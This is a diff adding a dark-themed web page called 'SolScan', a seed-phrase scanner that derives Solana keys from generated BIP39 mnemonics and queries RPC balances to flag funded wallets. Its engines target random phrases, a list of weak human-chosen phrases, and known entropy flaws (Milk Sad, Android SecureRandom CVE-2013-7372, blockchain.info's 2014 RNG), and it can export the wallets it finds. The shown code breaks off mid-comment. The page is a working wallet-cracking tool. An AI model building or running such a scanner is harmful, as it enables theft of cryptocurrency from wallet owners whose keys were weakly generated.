@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SolScan</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tweetnacl/1.0.3/nacl-fast.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#060608;--surface:#0d0d12;--surface2:#13131a;
+  --border:rgba(255,255,255,.06);--border2:rgba(255,255,255,.12);
+  --sol:#9945ff;--sol2:#14f195;--yellow:#fbbf24;--red:#f43f5e;
+  --sol-glow:rgba(153,69,255,.15);--sol2-glow:rgba(20,241,149,.1);
+  --text:#e8e8f0;--muted:rgba(232,232,240,.4);
+  --mono:'JetBrains Mono',monospace;--sans:'Inter',sans-serif;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(153,69,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(153,69,255,.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+.wrap{position:relative;z-index:1;max-width:480px;margin:0 auto;padding:1.5rem 1rem 3rem}
+.header{margin-bottom:1.5rem;padding-bottom:1.2rem;border-bottom:1px solid var(--border)}
+.logo{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+.logo-icon{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,var(--sol),var(--sol2));display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0}
+.logo-text{font-size:15px;font-weight:600;letter-spacing:-.3px}
+.logo-text span{color:var(--sol)}
+.header-sub{font-size:10px;color:var(--muted);font-family:var(--mono)}
+.slabel{font-size:10px;font-weight:500;color:var(--muted);letter-spacing:.08em;margin-bottom:8px;font-family:var(--mono)}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:16px;margin-bottom:12px}
+label.lbl{font-size:11px;color:var(--muted);display:block;margin-bottom:5px;font-family:var(--mono)}
+input,select,textarea{width:100%;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--mono);font-size:12px;padding:9px 12px;outline:none;transition:border-color .15s;-webkit-appearance:none}
+input:focus,select:focus,textarea:focus{border-color:rgba(153,69,255,.5)}
+textarea{resize:vertical;min-height:72px;line-height:1.6}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+.btn{border-radius:8px;border:1px solid var(--border2);background:transparent;color:var(--text);font-family:var(--sans);font-size:13px;font-weight:500;padding:10px 16px;cursor:pointer;width:100%;transition:all .15s}
+.btn:hover{background:rgba(255,255,255,.04)}
+.btn:active{transform:scale(.98)}
+.btn:disabled{opacity:.3;cursor:not-allowed}
+.btn-primary{background:var(--sol);border-color:var(--sol);color:#fff;box-shadow:0 0 20px var(--sol-glow)}
+.btn-primary:hover{opacity:.88;background:var(--sol)}
+.btn-danger{border-color:rgba(244,63,94,.4);color:var(--red)}
+.btn-danger:hover{background:rgba(244,63,94,.08)}
+.btn-sm{padding:5px 12px;font-size:11px;width:auto;border-radius:6px}
+.result{margin-top:10px;font-size:11px;font-family:var(--mono);padding:10px 12px;border-radius:8px;border:1px solid var(--border);word-break:break-all;line-height:1.6;display:none}
+.result.show{display:block}
+.result.hit{border-color:rgba(20,241,149,.3);background:var(--sol2-glow);color:var(--sol2)}
+.result.miss{color:var(--muted)}
+.result.err{border-color:rgba(244,63,94,.3);background:rgba(244,63,94,.05);color:var(--red)}
+.engine-cols{display:flex;flex-direction:column;gap:10px;margin-bottom:12px}
+.ecol{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:14px;transition:border-color .2s,box-shadow .2s}
+.ecol.active-random{border-color:rgba(153,69,255,.4);box-shadow:0 0 30px rgba(153,69,255,.06)}
+.ecol.active-human{border-color:rgba(20,241,149,.3);box-shadow:0 0 30px rgba(20,241,149,.05)}
+.ecol.active-milksad{border-color:rgba(251,191,36,.3);box-shadow:0 0 30px rgba(251,191,36,.05)}
+.ecol.active-securerandom{border-color:rgba(251,146,60,.3);box-shadow:0 0 30px rgba(251,146,60,.06)}
+.ecol.active-blockchainrng{border-color:rgba(34,211,238,.3);box-shadow:0 0 30px rgba(34,211,238,.06)}
+.ecol-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+.ecol-title{font-size:12px;font-weight:500;display:flex;align-items:center;gap:6px}
+.dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;background:var(--border2);transition:background .3s,box-shadow .3s}
+.dot.on-random{background:var(--sol);box-shadow:0 0 8px var(--sol)}
+.dot.on-human{background:var(--sol2);box-shadow:0 0 8px var(--sol2)}
+.dot.on-milksad{background:var(--yellow);box-shadow:0 0 8px var(--yellow)}
+.dot.on-securerandom{background:#fb923c;box-shadow:0 0 8px #fb923c}
+.dot.on-blockchainrng{background:#22d3ee;box-shadow:0 0 8px #22d3ee}
+.elog{background:var(--bg);border:1px solid var(--border);border-radius:8px;height:100px;overflow-y:auto;padding:8px 10px;font-family:var(--mono);font-size:10px;line-height:1.8;margin-bottom:10px;scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.elog::-webkit-scrollbar{width:3px}
+.elog::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.ll{color:var(--muted);word-break:break-all}
+.ll.hit{color:var(--sol2);font-weight:500}
+.ll.info{color:var(--sol)}
+.ll.err{color:var(--red)}
+.mini-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
+.mstat{background:var(--surface2);border-radius:6px;padding:7px 8px;text-align:center}
+.mstat-val{font-size:15px;font-weight:600;font-family:var(--mono);color:var(--text)}
+.mstat-lbl{font-size:9px;color:var(--muted);margin-top:1px}
+.gstats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px}
+.gstat{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:14px 10px;text-align:center}
+.gstat-val{font-size:22px;font-weight:600;font-family:var(--mono)}
+.gstat-lbl{font-size:10px;color:var(--muted);margin-top:3px}
+.gstat:nth-child(2) .gstat-val{color:var(--sol2)}
+.hits-card{background:var(--surface);border:1px solid rgba(20,241,149,.2);border-radius:14px;padding:14px;margin-bottom:12px;display:none;box-shadow:0 0 40px var(--sol2-glow)}
+.hits-card.show{display:block}
+.hits-header{font-size:11px;color:var(--sol2);font-family:var(--mono);margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.hits-badge{background:rgba(20,241,149,.15);color:var(--sol2);font-size:10px;padding:2px 8px;border-radius:20px}
+.hits-list{max-height:160px;overflow-y:auto}
+.hit-item{font-size:10px;font-family:var(--mono);color:var(--sol2);padding:6px 0;border-bottom:1px solid var(--border);word-break:break-all;line-height:1.6}
+.hit-item:last-child{border-bottom:none}
+.hit-tag{display:inline-block;font-size:9px;padding:1px 6px;border-radius:4px;margin-right:4px;font-weight:500}
+.hit-tag.random{background:rgba(153,69,255,.2);color:var(--sol)}
+.hit-tag.human{background:rgba(20,241,149,.15);color:var(--sol2)}
+.hit-tag.milksad{background:rgba(251,191,36,.15);color:var(--yellow)}
+.hit-tag.securerandom{background:rgba(251,146,60,.15);color:#fb923c}
+.hit-tag.blockchainrng{background:rgba(34,211,238,.12);color:#22d3ee}
+.master{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.divider{height:1px;background:var(--border);margin:16px 0}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.pulsing{animation:pulse 1.5s ease-in-out infinite}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="header">
+    <div class="logo">
+      <div class="logo-icon">◎</div>
+      <div class="logo-text"><span>Sol</span>Scan</div>
+    </div>
+    <div class="header-sub">BIP39 · SLIP-0010 · ed25519 · Helius RPC</div>
+  </div>
+  <div class="card">
+    <div class="slabel">config</div>
+    <label class="lbl">helius api key (Solana)</label>
+    <input type="password" id="helius-key" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" autocomplete="off" style="margin-bottom:8px">
+    <label class="lbl">alchemy api key (EVM)</label>
+    <input type="password" id="alchemy-key" placeholder="alch_xxxxxxxxxxxxxxxxxxxx" autocomplete="off" style="margin-bottom:6px">
+    <div style="display:flex;gap:6px;margin-bottom:10px;align-items:center">
+      <button class="btn btn-sm" onclick="testAlchemy()" style="width:auto;font-size:10px;padding:4px 12px;border-color:rgba(153,69,255,.4);color:var(--sol)">test koneksi</button>
+      <span id="alchemy-status" style="font-size:10px;font-family:var(--mono);color:var(--muted)">—</span>
+    </div>
+    <div class="row2" style="margin-bottom:10px">
+      <div><label class="lbl">network</label><select id="network"><option value="mainnet">mainnet</option><option value="devnet">devnet</option></select></div>
+      <div><label class="lbl">derivation path</label><select id="deriv-path"><option value="phantom">phantom</option><option value="sollet">sollet</option><option value="root">root</option></select></div>
+    </div>
+    <div style="font-size:11px;color:var(--muted);font-family:var(--mono);margin-top:4px">
+      ◎ Solana + EVM + BTC aktif otomatis (ETH·BNB·MATIC·BASE·ARB·OP·AVAX·FTM·CRO·zkSync · BTC P2PKH·P2WPKH·P2SH)
+    </div>
+  </div>
+  <div class="card">
+    <div class="slabel">check phrase</div>
+    <label class="lbl">seed phrase</label>
+    <textarea id="manual-phrase" placeholder="word1 word2 ... word12" style="margin-bottom:10px"></textarea>
+    <button class="btn btn-primary" onclick="checkManual()">check balance</button>
+    <div class="result" id="manual-result"></div>
+  </div>
+  <div class="divider"></div>
+  <div class="slabel">scanner engine</div>
+  <div class="card" style="margin-bottom:10px">
+    <div class="row3" style="margin-bottom:10px">
+      <div><label class="lbl">batch/tick</label><input type="number" id="batchsize" value="2" min="1" max="10"></div>
+      <div><label class="lbl">delay ms</label><input type="number" id="delay" value="400" min="100" max="5000"></div>
+      <div><label class="lbl">phrase len</label><select id="wc-random"><option value="12">12</option><option value="24">24</option></select></div>
+    </div>
+    <div class="master">
+      <button class="btn btn-primary" id="startbtn" onclick="startAll()">▶ start all</button>
+      <button class="btn btn-danger" id="stopbtn" onclick="stopAll()" disabled>■ stop all</button>
+    </div>
+  </div>
+  <div class="engine-cols">
+    <div class="ecol" id="ecol-random">
+      <div class="ecol-header">
+        <div class="ecol-title"><div class="dot" id="dot-random"></div><span>Random BIP39</span></div>
+        <button class="btn btn-sm" id="btn-random" onclick="toggleCol('random')">start</button>
+      </div>
+      <div class="elog" id="log-random"></div>
+      <div class="mini-stats">
+        <div class="mstat"><div class="mstat-val" id="tried-random">0</div><div class="mstat-lbl">tried</div></div>
+        <div class="mstat"><div class="mstat-val" id="hits-random">0</div><div class="mstat-lbl">hits</div></div>
+        <div class="mstat"><div class="mstat-val" id="rate-random">0/s</div><div class="mstat-lbl">rate</div></div>
+      </div>
+    </div>
+    <div class="ecol" id="ecol-human">
+      <div class="ecol-header">
+        <div class="ecol-title"><div class="dot" id="dot-human"></div><span>Human Pattern</span></div>
+        <button class="btn btn-sm" id="btn-human" onclick="toggleCol('human')">start</button>
+      </div>
+      <div class="elog" id="log-human"></div>
+      <div class="mini-stats">
+        <div class="mstat"><div class="mstat-val" id="tried-human">0</div><div class="mstat-lbl">tried</div></div>
+        <div class="mstat"><div class="mstat-val" id="hits-human">0</div><div class="mstat-lbl">hits</div></div>
+        <div class="mstat"><div class="mstat-val" id="rate-human">0/s</div><div class="mstat-lbl">rate</div></div>
+      </div>
+    </div>
+    <div class="ecol" id="ecol-milksad">
+      <div class="ecol-header">
+        <div class="ecol-title"><div class="dot" id="dot-milksad"></div><span>Milk Sad</span></div>
+        <button class="btn btn-sm" id="btn-milksad" onclick="toggleCol('milksad')">start</button>
+      </div>
+      <div class="elog" id="log-milksad"></div>
+      <div class="mini-stats">
+        <div class="mstat"><div class="mstat-val" id="tried-milksad">0</div><div class="mstat-lbl">tried</div></div>
+        <div class="mstat"><div class="mstat-val" id="hits-milksad">0</div><div class="mstat-lbl">hits</div></div>
+        <div class="mstat"><div class="mstat-val" id="rate-milksad">0/s</div><div class="mstat-lbl">rate</div></div>
+      </div>
+    </div>
+    <div class="ecol" id="ecol-securerandom">
+      <div class="ecol-header">
+        <div class="ecol-title"><div class="dot" id="dot-securerandom"></div><span>SecureRandom 2013</span></div>
+        <button class="btn btn-sm" id="btn-securerandom" onclick="toggleCol('securerandom')">start</button>
+      </div>
+      <div style="font-size:9px;color:#fb923c;font-family:var(--mono);margin-bottom:8px;opacity:.7">Android CVE-2013-7372 · weak SHA1PRNG entropy · 32-bit seed space</div>
+      <div class="elog" id="log-securerandom"></div>
+      <div class="mini-stats">
+        <div class="mstat"><div class="mstat-val" id="tried-securerandom">0</div><div class="mstat-lbl">tried</div></div>
+        <div class="mstat"><div class="mstat-val" id="hits-securerandom">0</div><div class="mstat-lbl">hits</div></div>
+        <div class="mstat"><div class="mstat-val" id="rate-securerandom">0/s</div><div class="mstat-lbl">rate</div></div>
+      </div>
+    </div>
+    <div class="ecol" id="ecol-blockchainrng">
+      <div class="ecol-header">
+        <div class="ecol-title"><div class="dot" id="dot-blockchainrng"></div><span>blockchain.info RNG 2014</span></div>
+        <button class="btn btn-sm" id="btn-blockchainrng" onclick="toggleCol('blockchainrng')">start</button>
+      </div>
+      <div style="font-size:9px;color:#22d3ee;font-family:var(--mono);margin-bottom:8px;opacity:.7">Math.random() keygen · V8 Xorshift128+ · Jan 1–14 2014 window</div>
+      <div class="elog" id="log-blockchainrng"></div>
+      <div class="mini-stats">
+        <div class="mstat"><div class="mstat-val" id="tried-blockchainrng">0</div><div class="mstat-lbl">tried</div></div>
+        <div class="mstat"><div class="mstat-val" id="hits-blockchainrng">0</div><div class="mstat-lbl">hits</div></div>
+        <div class="mstat"><div class="mstat-val" id="rate-blockchainrng">0/s</div><div class="mstat-lbl">rate</div></div>
+      </div>
+    </div>
+  </div>
+  <div class="gstats">
+    <div class="gstat"><div class="gstat-val" id="s-tried">0</div><div class="gstat-lbl">total tried</div></div>
+    <div class="gstat"><div class="gstat-val" id="s-hits">0</div><div class="gstat-lbl">total hits</div></div>
+    <div class="gstat"><div class="gstat-val" id="s-rate">0/s</div><div class="gstat-lbl">combined rate</div></div>
+  </div>
+  <div class="hits-card" id="hits-section">
+    <div class="hits-header" style="justify-content:space-between;flex-wrap:wrap;gap:6px">
+      <span>wallet found <span class="hits-badge" id="hit-count">0</span></span>
+      <div style="display:flex;gap:6px">
+        <button class="btn btn-sm" onclick="exportHits()" style="font-size:10px;padding:3px 10px;border-color:rgba(20,241,149,.3);color:var(--sol2)">↓ export</button>
+        <button class="btn btn-sm" onclick="importHits()" style="font-size:10px;padding:3px 10px;border-color:rgba(153,69,255,.3);color:var(--sol)">↑ import</button>
+        <button class="btn btn-sm" onclick="clearHistory()" style="font-size:10px;padding:3px 10px;border-color:rgba(244,63,94,.3);color:var(--red)">✕ clear</button>
+      </div>
+    </div>
+    <div class="hits-list" id="hitsbox"></div>
+  </div>
+</div>
+<script>
+const W = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby balance bamboo banana banner barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone book boost border boring borrow boss bottom bounce box boy bracket brain brand brave breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canvas canyon capable capital captain car carbon card cargo carpet carry cart case cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crazy cream credit creek crew cricket crime crisp critic cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise denial dentist deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empower empty enable enact endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip erase erosion escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude exercise exhaust exhibit exile exist exit exotic expand expire explain expose express extend extra eye fable face faculty faint faith fall false fame family famous fan fancy fantasy far fashion fat fatal father fatigue fault favorite feature february federal fee feed feel feet fellow felt fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus fog foil follow food foot force forest forget fork fortune forum forward fossil foster found fox fragile frame frequent fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game gap garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good goose gorilla gospel gossip govern gown grab grace grain grant grape grasp grass gravity great green grid grief grit grocery group grow grunt guard guide guilt guitar gun gym habit hair half hammer hamster hand happy harsh harvest hat have hawk hazard head health heart heavy hedgehog height hello helmet help hen hero hidden high hill hint hip hire history hobby hockey hold hole holiday hollow home honey hood hope horn hospital host hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon ignore ill illegal image imitate immense immune impact impose improve impulse inbox income increase index indicate indoor industry infant inflict inform inhale inject inner innocent input inquiry insane insect inside inspire install intact interest into invest invite involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump jungle junior junk just kangaroo keen keep ketchup key kick kid kingdom kiss kit kitchen kite kitten kiwi knee knife knock know lab lamp language laptop large later laugh laundry lava law lawn lawsuit layer lazy leader learn leave lecture left leg legal legend lemon lend length lens leopard lesson letter level liar liberty library license life lift like limb limit link lion liquid list little live lizard load loan lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury mad magic magnet maid main mammoth manage mandate mango mansion manual maple marble march margin marine market marriage mask master match material math matrix matter maximum maze meadow mean medal media melody melt member memory mention menu mercy mesh message metal method middle midnight milk million mimic mind minimum minor minute miracle miss mitten model modify mom monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music must mutual myself mystery naive name napkin narrow nasty nature near neck need negative neglect neither nephew nerve nest network news next nice night noble noise nominee noodle normal north notable note nothing notice novel now nuclear number nurse nut oak obey object oblige obscure obtain ocean october odor off offer office often oil okay old olive olympic omit once onion open option orange orbit orchard order ordinary organ orient original orphan ostrich other outdoor outside oval over own oyster ozone pact paddle page pair palace palm panda panel panic panther paper parade parent park parrot party pass patch path patrol pause pave payment peace peanut peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punish pupil purchase purity purpose push put puzzle pyramid quality quantum quarter question quick quit quiz quote rabbit raccoon race rack radar radio rage rail rain raise rally ramp ranch random range rapid rare rate rather raven reach ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remove render renew rent reopen repair repeat replace report require rescue resemble resist resource response result retire retreat return reunion reveal review reward rhythm ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance roof rookie rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salon salt salute same sample sand satisfy satoshi sauce sausage save say scale scan scatter scene scheme school science scissors scorpion scout scrap screen script scrub sea search season seat second secret section security seek segment select sell seminar senior sense sentence series service session settle setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling siege sight sign silent silk silly silver similar simple since sing siren sister situate six size sketch skill skin skirt skull slab slam sleep slender slice slide slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow soap soccer social sock solar soldier solid solution solve someone song soon sorry soul sound soup source south space spare spatial spawn speak special speed sphere spice spider spike spin spirit split spoil sponsor spoon spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stop store storm story stove strategy street strike strong struggle student stuff stumble subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply supreme sure surface surge surprise sustain swallow swamp swap swear sweet swift swim swing switch sword symbol symptom syrup table tackle tag tail talent tank tape target task tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing this thought three thrive throw thumb thunder ticket tilt timber time tiny tip tired title toast tobacco today together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap trash travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique universe unknown until unusual unveil update upgrade uphold upon upper upset urban useful useless usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venture venue verb verify version very veteran viable vibrant vicious victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm warrior waste water wave way wealth weapon wear weasel wedding weekend weird welcome west wet whale wheat wheel when where whip whisper wide width wife wild will win window wine wing wink winner winter wire wisdom wise wish witness wolf woman wonder wood wool word world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo".split(" ");
+
+/* ── SLIP-0010 ed25519 derivasi ── */
+async function phraseToKeypair(phrase, pathType = "phantom") {
+  const enc = new TextEncoder();
+  const mnemonicKey = await crypto.subtle.importKey(
+    "raw", enc.encode(phrase), {name:"PBKDF2"}, false, ["deriveBits"]
+  );
+  const seedBits = await crypto.subtle.deriveBits(
+    {name:"PBKDF2", hash:"SHA-512", salt: enc.encode("mnemonic"), iterations: 2048},
+    mnemonicKey, 512
+  );
+  const seed = new Uint8Array(seedBits);
+
+  if (pathType === "root") {
+    return nacl.sign.keyPair.fromSeed(seed.slice(0, 32));
+  }
+
+  const paths = {
+    phantom: [0x8000002C, 0x800001F5, 0x80000000, 0x80000000],
+    sollet:  [0x800001F5, 0x80000000, 0, 0],
+  };
+
+  let kL = seed.slice(0, 32);
+  let kR = seed.slice(32, 64);
+  const masterKey = await crypto.subtle.importKey("raw", kR, {name:"HMAC",hash:"SHA-512"}, false, ["sign"]);
+  const masterI   = new Uint8Array(await crypto.subtle.sign("HMAC", masterKey, new Uint8Array([0x00, ...kL, ...new Uint8Array(4)])));
+
+  const hmacSeed = async (key32, data) => {
+    const k = await crypto.subtle.importKey("raw", key32, {name:"HMAC",hash:"SHA-512"}, false, ["sign"]);
+    return new Uint8Array(await crypto.subtle.sign("HMAC", k, data));
+  };
+
+  const I = await hmacSeed(enc.encode("ed25519 seed"), seed);
+  kL = I.slice(0, 32); kR = I.slice(32, 64);
+
+  for (const idx of paths[pathType] ?? paths.phantom) {
+    const data = new Uint8Array([0x00, ...kL, ...[(idx>>>24)&0xff,(idx>>>16)&0xff,(idx>>>8)&0xff,idx&0xff]]);
+    const child = await hmacSeed(kR, data);
+    kL = child.slice(0, 32); kR = child.slice(32, 64);
+  }
+
+  return nacl.sign.keyPair.fromSeed(kL);
+}
+
+const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+function toBase58(bytes) {
+  let n = 0n;
+  for (const b of bytes) n = (n << 8n) + BigInt(b);
+  let r = "";
+  while (n > 0n) { r = B58[Number(n % 58n)] + r; n /= 58n; }
+  for (const b of bytes) { if (b !== 0) break; r = "1" + r; }
+  return r;
+}
+
+
+/* ── RPC via Helius ── */
+async function getRpcUrl() {
+  const key = document.getElementById("helius-key").value.trim();
+  if (!key) throw new Error("Helius API key belum diisi");
+  const net = document.getElementById("network").value;
+  return net === "devnet"
+    ? `https://devnet.helius-rpc.com/?api-key=${key}`
+    : `https://mainnet.helius-rpc.com/?api-key=${key}`;
+}
+
+async function getBalance(pubkey) {
+  const rpc = await getRpcUrl();
+  const r   = await fetch(rpc, {
+    method:  "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getBalance",params:[pubkey,{commitment:"confirmed"}]}),
+  });
+  if (r.status === 429) throw new Error("429 rate limit");
+  if (!r.ok) throw new Error("HTTP " + r.status);
+  const d = await r.json();
+  if (d.error) throw new Error(d.error.message);
+  return d.result?.value ?? 0;
+}
+
+/* ── HUMAN PATTERNS ── */
+const HUMAN_PATTERNS = (function() {
+  const seeds = ["abandon","ability","able","about","action","actual","add","age","aim","air",
+    "all","allow","alone","alpha","always","amazing","animal","another","answer","any","arm",
+    "army","art","ask","away","baby","balance","battle","beach","beauty","best","better","big",
+    "bird","birth","black","blue","body","bone","book","boss","brain","brave","bright","broken",
+    "brother","build","calm","car","cat","child","city","code","come","cool","cross","cry","dad",
+    "dance","danger","dark","day","dream","drive","dust","early","earth","easy","eight","end",
+    "energy","evil","face","faith","fall","fame","family","fire","first","fish","fix","flag",
+    "fly","food","foot","force","free","fresh","friend","fun","game","give","glad","god","gold",
+    "good","great","green","grow","hand","happy","have","head","heart","help","hero","high","hill",
+    "home","honey","hope","huge","human","hunt","idea","keep","key","kick","kind","king","kiss",
+    "know","land","large","last","laugh","law","lead","learn","life","light","like","lion","list",
+    "live","lock","long","love","luck","main","man","many","mark","master","math","mind","miss",
+    "mom","money","moon","more","move","music","name","need","next","nice","night","open","own",
+    "pain","park","party","pass","peace","pink","play","point","pool","power","pull","push","race",
+    "rain","real","red","rich","ride","right","ring","rise","road","rock","rose","rule","run",
+    "safe","same","sand","save","say","seed","sell","send","ship","sing","size","skill","slow",
+    "small","smart","smile","snow","song","soon","soul","south","space","speak","speed","stand",
+    "star","start","stay","stop","store","storm","sun","super","swim","team","tell","test","time",
+    "tiny","today","tool","top","train","tree","true","try","turn","two","use","vast","view",
+    "wait","walk","want","warm","water","wave","way","wear","west","will","win","wind","wine",
+    "wish","wolf","word","world","write","year","zero","zone"];
+  const all12 = seeds.map(w => Array(12).fill(w).join(" "));
+  const phrases = [
+    "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
+    "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong",
+    "one two three four five six seven eight nine ten eleven twelve",
+    "cat dog bird fish lion wolf bear deer fox owl rat bat",
+    "love life hope faith trust peace joy grace light truth power strength",
+    "sun moon star rain snow wind fire earth water air rock tree",
+    "happy lucky blessed chosen worthy noble brave loyal kind wise pure free",
+    "legal winner thank year wave sausage worth useful legal winner thank yellow",
+    "letter advice cage above prepare proud chaos thunder mercy moral legal winner",
+    "hamster diagram private dutch cause delay private meat slide toddler razor book",
+    "scheme spot photo card baby mountain device kick cradle pact join borrow",
+    "horn tenant knee talent sponsor spell gate clip pulse soap slush warm",
+    "excess behave track suit snow sugar purse actual face pipe alone stage",
+    "void come effort suffer camp survey warrior heavy shoot primary clutch crush",
+    "jelly better achieve collect unaware mountain possible outcome detect ocean use look",
+    "all hour make first leader extend hole alien behind guard gospel lava",
+    "test test test test test test test test test test test junk",
+    "north south east west up down left right front back near far",
+    "alpha beta gamma delta epsilon zeta eta theta iota kappa lambda mu",
+    "january february march april may june july august september october november december",
+    "apple banana cherry date elderberry fig grape honey iris jasmine kiwi lemon",
+    "red orange yellow green blue indigo violet black white pink brown gray",
+  ];
+  return [...new Set([...all12, ...phrases])];
+})();
+
+/* ── MILK SAD ── */
+// Genuine Milk Sad vulnerability (Aug 2023, milksad.info)
+// Affects wallets from liblithium weak entropy — seed collapses to
